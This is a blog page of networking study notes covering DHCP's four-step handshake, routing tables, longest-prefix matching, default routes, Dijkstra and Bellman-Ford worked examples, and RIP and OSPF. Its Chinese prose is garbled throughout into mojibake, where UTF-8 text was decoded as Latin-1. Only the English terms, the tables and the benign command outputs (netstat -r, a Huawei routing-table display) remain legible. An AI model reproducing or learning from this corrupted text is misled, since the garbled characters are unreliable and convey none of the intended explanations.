<p>å…¶å‰èº«æ˜¯BOOTP(bootrap prottocol),å¼•å¯¼ç¨‹åºåè®®,DHCPå…¼å®¹BOOTPçš„åŠŸèƒ½</p>
<p>DHCPæœåŠ¡å™¨æœ‰ä¸€ä¸ªåœ°å€æ± ,å­˜æ”¾DHCPæœåŠ¡å™¨å¯ä»¥åŠ¨æ€åˆ†é…çš„æ‰€æœ‰åœ°å€</p>
<h4 id="DHCPå·¥ä½œè¿‡ç¨‹"><a href="#DHCPå·¥ä½œè¿‡ç¨‹" class="headerlink" title="DHCPå·¥ä½œè¿‡ç¨‹"></a>DHCPå·¥ä½œè¿‡ç¨‹</h4><p>DHCPæ¡æ‰‹åˆ†ä¸ºå››æ­¥,ä¸»æœºè¦ç¦»å¼€å­ç½‘çš„æ—¶å€™,åªæœ‰ä¸€æ­¥</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101233453767.png" alt="å‰å››å¸§æ¡æ‰‹,æœ€åä¸€å¸§ç¦»å¼€"></p>
<table>
<thead>
<tr>
<th>DHCPæŠ¥æ–‡ç±»å‹</th>
<th>æ—¶æœº</th>
<th>æ–¹å‘</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>Discover</td>
<td>clientåˆšåŠ å…¥å­ç½‘,è¯•å›¾ç´¢è¦ä¸€ä¸ªipåœ°å€</td>
<td>DHCP clientâ€“å¹¿æ’­-&gt;DHCP servers</td>
<td>å‘æ‰€æœ‰DHCP serverç´¢è¦ipåœ°å€</td>
</tr>
<tr>
<td>Offer</td>
<td>DHCP serveræ”¶åˆ°äº†DIscoverä¹‹å</td>
<td>DHCP serverâ€“å•æ’­â€“&gt;DHCP client</td>
<td>æ‰€æœ‰DHCPæœåŠ¡å™¨éƒ½ä¼šå°è¯•ç»™å‡ºä¸€ä¸ªå¯ç”¨çš„ipåœ°å€</td>
</tr>
<tr>
<td>Request</td>
<td>clientæ”¶åˆ°Offerä¹‹å</td>
<td>DHCP clientâ€“å¹¿æ’­â€“&gt;DHCP servers</td>
<td>clientæ¥å—å…¶ä¸­ä¸€ä¸ªoffer,è°¢ç»å…¶ä»–offer</td>
</tr>
<tr>
<td>ACK</td>
<td>è¢«æ¥å—offerçš„serveræ”¶åˆ°Requestä¹‹å</td>
<td>DHCP serverâ€“å•æ’­â€“&gt;DHCP client</td>
<td>è¢«æ¥å—offerçš„serverå›å¤æ”¶åˆ°</td>
</tr>
<tr>
<td>Release</td>
<td>clientå°†è¦ç¦»å¼€å­ç½‘ä¹‹æ—¶</td>
<td>DHCP clientâ€“å¹¿æ’­â€“&gt;DHCP servers</td>
<td>é€šçŸ¥æ‰€æœ‰DHCP server,æœ¬clientè¦æ”¾å¼ƒipåœ°å€äº†,å¯ä»¥æ”¶å›åˆ°ipåœ°å€æ± </td>
</tr>
</tbody></table>
<p>å…¶ä¸­å››æ¬¡æ¡æ‰‹åŒå±äºä¸€ä¸ªTransaction</p>
<h3 id="è·¯ç”±åè®®"><a href="#è·¯ç”±åè®®" class="headerlink" title="è·¯ç”±åè®®"></a>è·¯ç”±åè®®</h3><h4 id="è·¯ç”±"><a href="#è·¯ç”±" class="headerlink" title="è·¯ç”±"></a>è·¯ç”±</h4><p>è·¯ç”±:ä»æŸä¸€ç½‘ç»œè®¾å¤‡å‘å‡º,å»å¾€æŸä¸ªç›®çš„åœ°,ç»è¿‡çš„è·¯å¾„</p>
<p>ç»ˆç«¯è®¡ç®—æœº,è·¯ç”±å™¨,ä¸‰å±‚äº¤æ¢æœºä¸Šå­˜åœ¨è·¯ç”±è¡¨</p>
<p>äºŒå±‚äº¤æ¢æœºä¸Šåªæœ‰arpè¡¨</p>
<p>æ ¹æ®è·¯ç”±çš„å‘ç°æ–¹å¼,è·¯ç”±å¯ä»¥åˆ†æˆä¸‰ç§</p>
<p>ç›´è¿è·¯ç”±:è·¯ç”±å™¨è‡ªä¸»å‘ç°ç›¸è¿ç«¯å£çš„ç½‘ç»œçš„è·¯ç”±</p>
<p>é™æ€è·¯ç”±:äººå·¥ç»´æŠ¤è·¯ç”±è¡¨</p>
<p>åŠ¨æ€è·¯ç”±:å¯å‘¨æœŸæ€§æ›´æ–°</p>
<h4 id="è·¯ç”±è¡¨"><a href="#è·¯ç”±è¡¨" class="headerlink" title="è·¯ç”±è¡¨"></a>è·¯ç”±è¡¨</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107110756489.png" alt="image-20221107110756489"></p>
<p>å­ç½‘æ©ç </p>
<p>ç½‘ç»œåœ°å€</p>
<p>ä¸‹ä¸€è·³åœ°å€</p>
<p>æœå‘ä¸‹ä¸€è·³çš„ç«¯å£</p>
<blockquote>
<p>æ¯”å¦‚ç½‘ç»œæ‹“æ‰‘é•¿è¿™æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212162804137.png" alt="image-20230212162804137"></p>
<p>å…¶ä¸­R1è·¯ç”±è¡¨é•¿è¿™æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212162818521.png" alt="image-20230212162818521"></p>
<p>å¦‚æœå›¾22.6ä¸­çš„ä¸€ä¸ªç›®çš„åœ°å€ä¸º180.70.65.140çš„åˆ†ç»„åˆ°è¾¾è·¯ç”±å™¨R1ï¼Œè¯´æ˜å…¶è½¬å‘è¿‡ç¨‹ã€‚</p>
<p>180.70.65.140è¿™ä¸ªåœ°å€å±äº180.70.65.128&#x2F;25ç½‘æ®µ,å› æ­¤åº”è¯¥ä»m0å£å‡ºå»</p>
<p>é¦–å…ˆè·¯ç”±å™¨ä¼šåœ¨180.70.65.128&#x2F;25ç½‘æ®µä¸­ä½¿ç”¨ARPåè®®è·å¾—ä¸‹ä¸€è·³çš„MACåœ°å€,ç„¶åå°†IPåˆ†ç»„è½¬å‘ç»™ä¸‹ä¸€è·³</p>
</blockquote>
<h5 id="netstat-r"><a href="#netstat-r" class="headerlink" title="netstat -r"></a>netstat -r</h5><p>åœ¨winæˆ–è€…linuxä¸»æœºä¸Šä½¿ç”¨netstat -rå‘½ä»¤å³å¯æŸ¥çœ‹æœ¬æœºçš„è·¯ç”±è¡¨</p>
<p>æ¯”å¦‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/mnt/c/Users/86135]</span><br><span class="line">â””â”€# netstat -r</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface</span><br><span class="line">default         Executor        0.0.0.0         UG        0 0          0 eth0</span><br><span class="line">172.29.112.0    0.0.0.0         255.255.240.0   U         0 0          0 eth0</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æ ç›®</th>
<th>Destination</th>
<th>Gateway</th>
<th>Genmask</th>
<th>Flags</th>
<th>MSS Window</th>
<th>irtt</th>
<th>Iface</th>
</tr>
</thead>
<tbody><tr>
<td>æ„ä¹‰</td>
<td>ç›®çš„åœ°å€</td>
<td>ç½‘å…³</td>
<td>ç›®çš„åœ°å€æ©ç </td>
<td></td>
<td></td>
<td></td>
<td>ç›®æ ‡ç«¯å£</td>
</tr>
</tbody></table>
<p>åœ¨eNSPè·¯ç”±å™¨ä¸Šç”¨display ip routing-tableä¹Ÿå¯ä»¥æŸ¥çœ‹è¯¥è·¯ç”±å™¨çš„è·¯ç”±è¡¨</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]display ip routing-table</span><br><span class="line">Route Flags: R - relay, D - download to fib</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">Routing Tables: Public</span><br><span class="line">         Destinations : 2        Routes : 2        </span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">      127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0</span><br><span class="line">      127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0</span><br></pre></td></tr></table></figure>

<p>ä¸¤è€…çš„ä¸»è¦åŒºåˆ«å°±æ˜¯è¿™ä¸ªNextHop</p>
<p>ä¸»æœºçš„ç½‘å¡ä¸éœ€è¦ä¸‹ä¸€è·³åœ°å€,åªéœ€è¦ç»´æŠ¤ä¸€ä¸ªç½‘å…³çš„åœ°å€</p>
<p>è·¯ç”±å™¨éœ€è¦ç»´æŠ¤ä¸‹ä¸€æ¡çš„åœ°å€</p>
<h5 id="æœ€é•¿æ©ç åŒ¹é…"><a href="#æœ€é•¿æ©ç åŒ¹é…" class="headerlink" title="æœ€é•¿æ©ç åŒ¹é…"></a>æœ€é•¿æ©ç åŒ¹é…</h5><p>ä»è·¯ç”±è¡¨ä¸­é€‰æ‹©å…·æœ‰æœ€é•¿æ©ç çš„è·¯ç”±</p>
<p>æ©ç è¶Šé•¿,åœ°å€å—è¶Šå°,è·¯ç”±è¶Šå…·ä½“</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163420071.png" alt="image-20230212163420071"></p>
<p>å‡å¦‚R2è·¯ç”±å™¨æ”¶åˆ°äº†ä¸€ä¸ªç›®çš„åœ°å€ä¸º140.24.7.192çš„åœ°å€,</p>
<p>è¯¥ç›®çš„åœ°å€å³å±äº140.24.7.192&#x2F;26ç½‘æ®µ,</p>
<p>åˆå±äº140.24.7.0&#x2F;24ç½‘æ®µ,</p>
<p>åº”è¯¥å‘å¾€æœ€é•¿å…·æœ‰æ©ç çš„ç½‘æ®µ,å³140.24.7.192&#x2F;26</p>
<h5 id="åœ°å€èšåˆ"><a href="#åœ°å€èšåˆ" class="headerlink" title="åœ°å€èšåˆ"></a>åœ°å€èšåˆ</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163621450.png" alt="image-20230212163621450"></p>
<h5 id="é»˜è®¤è·¯ç”±"><a href="#é»˜è®¤è·¯ç”±" class="headerlink" title="é»˜è®¤è·¯ç”±"></a>é»˜è®¤è·¯ç”±</h5><p>é»˜è®¤è·¯ç”±å°±è¿™ç§</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107113423289.png" alt="image-20221107113423289"></p>
<p>å­ç½‘æ©ç æ˜¯0,æ„å‘³ç€é»˜è®¤è·¯ç”±åœ¨è·¯ç”±è¡¨ä¸­æ’åœ¨æœ€å,ä¹Ÿå°±æ˜¯æœ€åçš„é€‰æ‹©.</p>
<p>åªè¦æ˜¯å‰é¢éƒ½å¤±é…çš„åŒ…éƒ½ä¼šä»é»˜è®¤è·¯ç”±è¿™é‡ŒåŒ¹é…æˆåŠŸ.è¯¥æ¡è®°å½•åªéœ€è¦è®°å½•ä»æœ¬è·¯ç”±å™¨ä¸­çš„å“ªä¸ªç«¯å£å‡ºå»,ä¸‹ä¸€æ¡æ˜¯è°</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107113605164.png" alt="image-20221107113605164"></p>
<p>æ¯”å¦‚è¿™é‡Œçš„Bè·¯ç”±å™¨,é™¤äº†10.1.0.0&#x2F;24,å…¶ä»–çš„åŒ…åªèƒ½å‘å¾€Cè·¯ç”±å™¨,äºæ˜¯B-&gt;Cè¿™æ¡è·¯ç”±å°±æ˜¯Bçš„é»˜è®¤è·¯ç”±</p>
<h4 id="è·¯ç”±åè®®ä¼˜å…ˆçº§"><a href="#è·¯ç”±åè®®ä¼˜å…ˆçº§" class="headerlink" title="è·¯ç”±åè®®ä¼˜å…ˆçº§"></a>è·¯ç”±åè®®ä¼˜å…ˆçº§</h4><p>ç›´è¿è·¯ç”±çš„ä¼˜å…ˆçº§æœ€é«˜,å› ä¸º å…¶æœ€å¯é </p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107112300287.png" alt="image-20221107112300287"></p>
<p>IPè·¯ç”±è¡¨ä¸ºè·¯ç”±å™¨å®é™…å·¥ä½œæ—¶ä½¿ç”¨çš„è·¯ç”±è¡¨</p>
<p>å»ºç«‹è¯¥è¡¨çš„è¿‡ç¨‹ä¸­å¯èƒ½è€ƒè™‘äº†å¾ˆå¤šè·¯ç”±åè®®,æ¯”å¦‚RIP,OSPF,å¯¹äºåŒä¸€ä¸ªDestinationçš„è·¯ç”±è®°å½•,ä¼˜å…ˆä½¿ç”¨é«˜ä¼˜å…ˆçº§è·¯ç”±åè®®ç»™å‡ºçš„è·¯ç”±è®°å½•</p>
<p>æ¯”å¦‚ä¹‹ç±»å¯¹äº24.10.0&#x2F;24è¿™ä¸ªåœ°å€,RIPå’ŒOSPFä¸¤ç§åè®®ç»™å‡ºäº†ä¸åŒçš„ä¸‹ä¸€è·³,å¿…ç„¶æœ‰ä¼˜åŠ£.ç”±äºOSPFåè®®çš„ä¼˜å…ˆçº§é«˜,æœ€ç»ˆå†™å…¥IPè·¯ç”±è¡¨çš„,æ¥è‡ªOSPFåè®®</p>
<h4 id="è·¯ç”±ç®—æ³•"><a href="#è·¯ç”±ç®—æ³•" class="headerlink" title="è·¯ç”±ç®—æ³•"></a>è·¯ç”±ç®—æ³•</h4><h5 id="dijkstra"><a href="#dijkstra" class="headerlink" title="dijkstra"></a>dijkstra</h5><p>è¾¹æƒæ˜¯é“¾è·¯ä»£ä»·,ä¸¤èŠ‚ç‚¹ä¸è¿æ¥æ—¶é“¾è·¯ä»£ä»·ä¸ºæ— ç©·å¤§</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163803322.png" alt="image-20230212163803322"></p>
<p>ç¬¦å·çº¦å®š:</p>
<table>
<thead>
<tr>
<th>ç¬¦å·</th>
<th>æ„ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>T</td>
<td>å·²ç»â€æ‹“å±•â€çš„èŠ‚ç‚¹é›†åˆ</td>
</tr>
<tr>
<td>N</td>
<td>ç½‘ç»œä¸­çš„èŠ‚ç‚¹é›†åˆ</td>
</tr>
<tr>
<td>s</td>
<td>æºç‚¹</td>
</tr>
<tr>
<td>w(i,j)</td>
<td>ä»iåˆ°jèŠ‚ç‚¹çš„é“¾è·¯ä»£ä»·</td>
</tr>
<tr>
<td>L(i)</td>
<td>ç›®å‰ä»æºç‚¹såˆ°ièŠ‚ç‚¹çš„æœ€å°ä»£ä»·</td>
</tr>
</tbody></table>
<p>ä»¥1å·èŠ‚ç‚¹ä¸ºèµ·ç‚¹,è®¡ç®—å…¶ä¸å…¶ä»–æ‰€æœ‰ç‚¹çš„æœ€çŸ­è·ç¦»</p>
<p>è®¡ç®—è¿‡ç¨‹:</p>
<table>
<thead>
<tr>
<th>Iter</th>
<th><em>T</em></th>
<th><em>L</em>(2)</th>
<th>Path</th>
<th><em>L</em>(3)</th>
<th>Path</th>
<th><em>L</em>(4)</th>
<th>Path</th>
<th><em>L</em>(5)</th>
<th>Path</th>
<th><em>L</em>(6)</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>{1}</td>
<td>2</td>
<td>1-2</td>
<td>5</td>
<td>1-3</td>
<td>1</td>
<td>1-4</td>
<td>âˆ</td>
<td>-</td>
<td>âˆ</td>
<td>-</td>
</tr>
<tr>
<td>2</td>
<td>{1,4}</td>
<td>2</td>
<td>1-2</td>
<td>4</td>
<td>1-4-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>âˆ</td>
<td>-</td>
</tr>
<tr>
<td>3</td>
<td>{1, 2, 4}</td>
<td>2</td>
<td>1-2</td>
<td>4</td>
<td>1-4-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>âˆ</td>
<td>-</td>
</tr>
<tr>
<td>4</td>
<td>{1, 2, 4, 5}</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
<tr>
<td>5</td>
<td>{1, 2, 3, 4, 5}</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
<tr>
<td>6</td>
<td>{1, 2, 3, 4, 5, 6}</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
</tbody></table>
<h5 id="bellmanford"><a href="#bellmanford" class="headerlink" title="bellmanford"></a>bellmanford</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163803322.png" alt="image-20230212163803322"></p>
<p>$L_h(i)$ä»æºç‚¹åˆ°iç‚¹,æœ€å¤šç»è¿‡hæ¡é“¾è·¯æ—¶,æœ€å°é“¾è·¯ä»£ä»·å’Œ</p>
<p>è®¡ç®—è¿‡ç¨‹</p>
<table>
<thead>
<tr>
<th><em>h</em></th>
<th>$L_h(2)$</th>
<th>Path</th>
<th>$L_h(3)$</th>
<th>Path</th>
<th>$L_h(4)$</th>
<th>Path</th>
<th>$L_h(5)$</th>
<th>Path</th>
<th>$L_h(6)$</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>âˆ</td>
<td>-</td>
<td>âˆ</td>
<td>-</td>
<td>âˆ</td>
<td>-</td>
<td>âˆ</td>
<td>-</td>
<td>âˆ</td>
<td>-</td>
</tr>
<tr>
<td>1</td>
<td>2</td>
<td>1-2</td>
<td>5</td>
<td>1-3</td>
<td>1</td>
<td>1-4</td>
<td>âˆ</td>
<td>-</td>
<td>âˆ</td>
<td>-</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>1-2</td>
<td>4</td>
<td>1-4-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>10</td>
<td>1-3-6</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
<tr>
<td>4</td>
<td>2</td>
<td>1-2</td>
<td>3</td>
<td>1-4-5-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>4</td>
<td>1-4-5-6</td>
</tr>
</tbody></table>
<h4 id="åŠ¨æ€è·¯ç”±åè®®"><a href="#åŠ¨æ€è·¯ç”±åè®®" class="headerlink" title="åŠ¨æ€è·¯ç”±åè®®"></a>åŠ¨æ€è·¯ç”±åè®®</h4><p>åŠ¨æ€è·¯ç”±åè®®çš„ç›®çš„:</p>
<p>çŸ¥é“æœ‰å“ªäº›é‚»å±…è·¯ç”±å™¨ï¼›</p>
<p>èƒ½å¤Ÿå­¦ä¹ åˆ°ç½‘ç»œä¸­æœ‰å“ªäº›ç½‘æ®µï¼›</p>
<p>èƒ½å¤Ÿå­¦ä¹ åˆ°è‡³æŸä¸ªç½‘æ®µçš„æ‰€æœ‰è·¯å¾„ï¼›</p>
<p>èƒ½å¤Ÿä»ä¼—å¤šçš„è·¯å¾„ä¸­é€‰æ‹©æœ€ä½³çš„è·¯å¾„ï¼›</p>
<p>èƒ½å¤Ÿç»´æŠ¤å’Œæ›´æ–°è·¯ç”±ä¿¡æ¯ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114110756904.png" alt="image-20221114110756904"></p>
<h5 id="è‡ªæ²»ç³»ç»Ÿ"><a href="#è‡ªæ²»ç³»ç»Ÿ" class="headerlink" title="è‡ªæ²»ç³»ç»Ÿ"></a>è‡ªæ²»ç³»ç»Ÿ</h5><p>æ¯ä¸ªè‡ªæ²»ç³»ç»Ÿå†…éƒ¨ä½¿ç”¨ä¸€å¥—ç›¸åŒçš„è·¯ç”±åè®®,åŒçº§çš„è‡ªæ²»ç³»ç»Ÿä½¿ç”¨åŒä¸€å¥—è·¯ç”±åè®®,è‡ªæ²»ç³»ç»Ÿå¯ä»¥åµŒå¥—è‡ªæ²»ç³»ç»Ÿ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212170909097.png" alt="image-20230212170909097"></p>
<p>æ¯ä¸ªè‡ªæ²»ç³»ç»Ÿéƒ½è¦åˆ†é…ä¸€ä¸ªASå·,ç”¨äºè·¯ç”±</p>
<p>æœ¬çº§è‡ªæ²»ç³»ç»Ÿåªè´Ÿè´£å°†æœ¬çº§çš„IPåˆ†ç»„å‘å¾€æœ¬çº§ç›®æ ‡è‡ªæ²»ç³»ç»Ÿ,å‰©ä¸‹å…·ä½“å‘å¾€ç›®æ ‡ASä¸­çš„å“ªä¸€å°ä¸»æœº,<strong>ç”±è¯¥ASå†…éƒ¨çš„è·¯ç”±åè®®è‡ªå·±å†³å®š</strong></p>
<h5 id="RIP-on-è·ç¦»å‘é‡ç®—æ³•"><a href="#RIP-on-è·ç¦»å‘é‡ç®—æ³•" class="headerlink" title="RIP on è·ç¦»å‘é‡ç®—æ³•"></a>RIP on è·ç¦»å‘é‡ç®—æ³•</h5><p>RIPåè®®åŸºäºè·ç¦»å‘é‡åè®®</p>
<p>RIPåè®®ä¸­çš„è·ç¦»æˆ–è€…è¯´ä»£ä»·,å°±æ˜¯è·³æ•°</p>
<p>Distance vector,è·ç¦»å‘é‡ç®—æ³•</p>
<p>æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ª</p>
<h6 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h6><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114110945325.png" alt="image-20221114110945325"></p>
<p>æœ€åˆçš„æ‹“æ‰‘ä¸­,æ¯ä¸ªè·¯ç”±å™¨éƒ½åªçŸ¥é“ä¸è‡ªå·±ç›´è¿çš„è·¯ç”±å™¨.å…¶è·¯ç”±è¡¨ä¸­åªæœ‰è¿™äº›è·¯ç”±å™¨çš„ä¿¡æ¯</p>
<p>æ¯”å¦‚Då®é™…ä¸Šå¼ä¸çŸ¥é“Bçš„å­˜åœ¨çš„,å®ƒåªçŸ¥é“Açš„å­˜åœ¨.ä¸Šå›¾ä¸­çš„Dçš„è·¯ç”±è¡¨ä¸­ç”»å‡º BCE,ä½†æ˜¯è·ç¦»æ˜¯$\infin$,å°±ç›¸å½“äºä¸çŸ¥é“å®ƒçš„å­˜åœ¨</p>
<h6 id="å…±äº«è·¯ç”±ä¿¡æ¯-è·ç¦»å‘é‡æ›´æ–°"><a href="#å…±äº«è·¯ç”±ä¿¡æ¯-è·ç¦»å‘é‡æ›´æ–°" class="headerlink" title="å…±äº«è·¯ç”±ä¿¡æ¯&amp;è·ç¦»å‘é‡æ›´æ–°"></a>å…±äº«è·¯ç”±ä¿¡æ¯&amp;è·ç¦»å‘é‡æ›´æ–°</h6><p>å‘¨æœŸå…±äº«</p>
<p>æ¯ä¸ªç»“ç‚¹éƒ½ä¼šå°†è‡ªå·±çŸ¥é“çš„æ‰€æœ‰éƒ½å‘Šè¯‰é‚»å±…</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114111341938.png" alt="image-20221114111341938"></p>
<p>è¿™é‡ŒCå…±äº«ç»™Açš„æ‰€æœ‰ä¿¡æ¯éƒ½è¦ä»£ä»·+2,è¿™æ˜¯ACä¹‹é—´çš„è¾¹æƒ</p>
<p>Cå‘å¾€Açš„æ‰€æœ‰ä¿¡æ¯,å…¶Nextéƒ½æ˜¯C,æ„æ€æ˜¯,å¦‚æœAéœ€è¦ä½¿ç”¨è¯¥è¡¨ä¸­çš„ä¸€äº›ä¿¡æ¯,ä¸€å®šæ˜¯Cçš„è´¡çŒ®,å±Šæ—¶Aä¼šä»¥Cä½œä¸ºä¸‹ä¸€è·³å‘é€ç›¸åº”æ•°æ®åŒ…</p>
<p>Açš„è€è·¯ç”±è¡¨å’ŒåŠ ä¸ŠACè¾¹æƒä»£ä»·ä¹‹åçš„Cå…±äº«è¡¨è¿›è¡Œæ¯”è¾ƒ,æ¯ä¸€æ¡è·¯ç”±éƒ½å–Costæœ€å°å€¼,å¾—åˆ°æ–°è·¯ç”±è¡¨</p>
<h6 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹:"></a>ç¼ºç‚¹:</h6><p>ä¸¤ä¸ªèŠ‚ç‚¹çš„ä¸ç¨³å®šæ€§</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221114111751153.png" alt="image-20221114111751153"></p>
<p>å½“Aä¸Xä¹‹é—´çš„é“¾è·¯æ–­å¼€å,Aåˆ°Xçš„è·ç¦»æˆä¸ºæ— ç©·å¤§,å¦‚æœå› ä¸ºä¸¢åŒ…ç­‰åŸå› ,Aæ²¡æœ‰åŠæ—¶é€šçŸ¥B,Xå·²ç»æ–­å¼€äº†,é‚£ä¹ˆBå°±ä¸€ç›´è®¤ä¸ºB-&gt;A-&gt;Xè¿™æ¡é“¾è·¯æ­£å¸¸.å½“Bç»™Aäº¤æ¢è·¯ç”±ä¿¡æ¯çš„æ—¶å€™,Aåˆè®¤ä¸ºBè¿˜æœ‰å…¶ä»–é€šè·¯åˆ°X(å®é™…ä¸Šå°±æ˜¯ä¹‹å‰çš„é“¾è·¯).äºæ˜¯Aæœ‰åˆ°Xçš„åŒ…å°±ä¼šå‘å¾€B,Båˆå‘å¾€A,Aåˆå‘å¾€Bâ€¦</p>
<p>ä¸‰ä¸ªèŠ‚ç‚¹çš„ä¸ç¡®å®šæ€§:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212172241217.png" alt="image-20230212172241217"></p>
<p>Xå·²ç»ä¸å’ŒABCè¿æ¥äº†,Aä¸€å¼€å§‹ä¹Ÿæ˜¯çŸ¥é“Xå·²ç»ç¦»å¼€çš„,ä½†æ˜¯ç»è¿‡å…±äº«å,ABCéƒ½ç³Šæ¶‚äº†</p>
<h6 id="åŸºäºè·ç¦»å‘é‡çš„RIPåè®®"><a href="#åŸºäºè·ç¦»å‘é‡çš„RIPåè®®" class="headerlink" title="åŸºäºè·ç¦»å‘é‡çš„RIPåè®®"></a>åŸºäºè·ç¦»å‘é‡çš„RIPåè®®</h6><p>å°±æ˜¯å°†é“¾è·¯ä»£ä»·æ¢æˆè·³æ•°</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212173742433.png" alt="image-20230212173742433"></p>
<h5 id="OSPF-on-é“¾è·¯çŠ¶æ€è·¯ç”±é€‰æ‹©ç®—æ³•"><a href="#OSPF-on-é“¾è·¯çŠ¶æ€è·¯ç”±é€‰æ‹©ç®—æ³•" class="headerlink" title="OSPF on é“¾è·¯çŠ¶æ€è·¯ç”±é€‰æ‹©ç®—æ³•"></a>OSPF on é“¾è·¯çŠ¶æ€è·¯ç”±é€‰æ‹©ç®—æ³•</h5><p>é“¾è·¯çŠ¶æ€:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182013525.png" alt="image-20230212182013525"></p>
<p>æ¯ä¸ªèŠ‚ç‚¹éƒ½çŸ¥é“ä¸€äº›é“¾è·¯ä¿¡æ¯,æ¯”å¦‚é“¾è·¯ä»£ä»·,è¿æ¥çŠ¶æ€</p>
<p>æ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šå­—èŠ‚å»ºç«‹ä¸€å¼ è·¯ç”±è¡¨,é€šè¿‡æ´ªèŒƒå‘å…¶ä»–èŠ‚ç‚¹å¹¿æ’­çŠ¶æ€</p>
<p>æ¯ä¸ªèŠ‚ç‚¹è‡ªå·±æ„å»ºä¸€ä¸ªæœ€çŸ­è·¯å¾„æ ‘,å¹¶ä»¥æ­¤æ„å»ºè·¯ç”±è¡¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182406755.png" alt="image-20230212182406755"></p>
<p>æœ€çŸ­è·¯å¾„æ ‘:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212182518356.png" alt="image-20230212182518356"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><a class="page-number" href="/impossible/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/impossible/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/11/">11</a><a class="extend next" rel="next" href="/impossible/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
